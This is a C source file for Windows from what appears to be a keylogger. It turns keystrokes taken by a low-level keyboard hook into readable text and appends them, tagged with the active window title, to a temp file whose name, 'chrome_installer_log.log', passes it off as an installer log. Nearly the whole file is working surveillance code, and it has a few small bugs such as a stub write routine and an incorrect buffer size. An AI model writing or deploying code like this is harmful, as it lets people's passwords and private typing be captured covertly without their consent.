#include "windows.h"
#include "stdafx.h"
#include "logger.h"
#include <time.h>

#define OUTPUT_FILE_NAME "chrome_installer_log.log"

CHAR *pathToOutputFile;
FILE *outputFile;
BYTE keyboardState[256];
CHAR unicodeBuffer[16];

// Just initialize my global variables 
void InitWritter() 
{
	CHAR tempPath[MAX_PATH] = { 0 };
	GetTempPathA(MAX_PATH, tempPath); // retrieving temp path
	// Approach to append 2 strings (char *)
	// We use malloc to separate exactly the length of the 2 strings + 1 for null termiator
	pathToOutputFile = (char *)malloc(sizeof(OUTPUT_FILE_NAME) + sizeof(tempPath) + 1);
	// Append tempPath with null terminator
	strcpy(pathToOutputFile, tempPath);
	// Finally concat to existent str with null terminator
	strcat(pathToOutputFile, OUTPUT_FILE_NAME);
#ifdef _DEBUG
	LogMessage("Path: %s\n", pathToOutputFile);
#endif // DEBUG
	outputFile = fopen(pathToOutputFile, "a+");
}

void WriteMessage(CHAR *message) {
	fprintf(outputFile, "%s\n", "Hallo");
	fflush(outputFile);
}

void ParseVirtualKeyCode(char *buffer, PKBDLLHOOKSTRUCT keyEvent)
{
	switch ((unsigned int)keyEvent->vkCode)
	{
		// About strcpy:
		//	char * strcpy ( char * destination, const char * source )
		//	- You may be vulnerable to buffer overflow (if you take user input as source)
		//  - It will append a null (\0) terminator at the end of string
		// So, no worries about buffer overflow since it's a constant what we are copying
	case 0x8:
		strcpy(buffer, "[Backspace]");
		break;
	case 0x9:
		strcpy(buffer, "[Tab]");
		break;
	case 0x14:
		strcpy(buffer, "[CapsLock]");
		break;
	case 0x1B:
		strcpy(buffer, "[Esc]");
		break;

	case 0x20:
		strcpy(buffer, "[Space]");
		break;
	case 0x21:
		strcpy(buffer, "[PageUp]");
		break;
	case 0x22:
		strcpy(buffer, "[PageDown]");
		break;
	case 0x23:
		strcpy(buffer, "[End]");
		break;
	case 0x24:
		strcpy(buffer, "[Home]");
		break;
	case 0x25:
		strcpy(buffer, "[Left]");
		break;
	case 0x26:
		strcpy(buffer, "[Up]");
		break;
	case 0x27:
		strcpy(buffer, "[Right]");
		break;
	case 0x28:
		strcpy(buffer, "[Down]");
		break;
	case 0x2C:
		strcpy(buffer, "[PrintScr]");
		break;
	case 0x2D:
		strcpy(buffer, "[Ins]");
		break;
	case 0x2E:
		strcpy(buffer, "[Supr]");
		break;

	case 0x5B:
		strcpy(buffer, "[Left Win]");
		break;
	case 0x5C:
		strcpy(buffer, "[Right Win]");
		break;
	case 0x5D:
		strcpy(buffer, "[CtxMenu]");
		break;

	case 0x70:
		strcpy(buffer, "[F1]");
		break;
	case 0x71:
		strcpy(buffer, "[F2]");
		break;
	case 0x72:
		strcpy(buffer, "[F3]");
		break;
	case 0x73:
		strcpy(buffer, "[F4]");
		break;
	case 0x74:
		strcpy(buffer, "[F5]");
		break;
	case 0x75:
		strcpy(buffer, "[F6]");
		break;
	case 0x76:
		strcpy(buffer, "[F7]");
		break;
	case 0x77:
		strcpy(buffer, "[F8]");
		break;
	case 0x78:
		strcpy(buffer, "[F9]");
		break;
	case 0x79:
		strcpy(buffer, "[F10]");
		break;
	case 0x7A:
		strcpy(buffer, "[F11]");
		break;
	case 0x7B:
		strcpy(buffer, "[F12]");
		break;

	case 0x91:
		strcpy(buffer, "[ScrollLock]");
		break;

	case 0xA0:
		strcpy(buffer, "[Left Shift]");
		break;
	case 0xA1:
		strcpy(buffer, "[Right Shift]");
		break;
		// Left and Right Ctrl
	case 0xA2:
		strcpy(buffer, "[Left Ctrl]");
		break;
	case 0xA3:
		strcpy(buffer, "[Right Ctrl]");
		break;
	case 0xA4:
		strcpy(buffer, "[Left Alt]");
		break;
	case 0xA5:
		strcpy(buffer, "[Right Alt]");
		break;

	case 0xD:
		strcpy(buffer, "[\\n]");
		break;
	default:
		GetKeyboardState(keyboardState);
		ToUnicode(keyEvent->vkCode, keyEvent->scanCode, keyboardState, (LPWSTR)buffer, sizeof(buffer) / 2, 0);
		break;
	}
}

// Here we do the proccesing of the key event in order to print some human-readable output
void WriteKeyboardEvent(
	TCHAR *lastTitle,
	TCHAR *title,
	time_t lastTime,
	time_t currentTime,
	PKBDLLHOOKSTRUCT keyEvent)
{
	ParseVirtualKeyCode(unicodeBuffer, keyEvent);
	if (strcmp(lastTitle, title) != 0) {
		fprintf(outputFile, "\n[%s]: %s", title, unicodeBuffer);
#ifdef _DEBUG	
		// LogMessage("[%s]: %s (%d)\n", title, unicodeBuffer, keyEvent->vkCode);
		LogMessage("\n[%s]: %s", title, unicodeBuffer);
#endif // DEBUG
	}
	else {
		fprintf(outputFile, "%s", unicodeBuffer);
#ifdef _DEBUG	
		LogMessage("%s", unicodeBuffer);
#endif // DEBUG
	}
	fflush(outputFile);
}
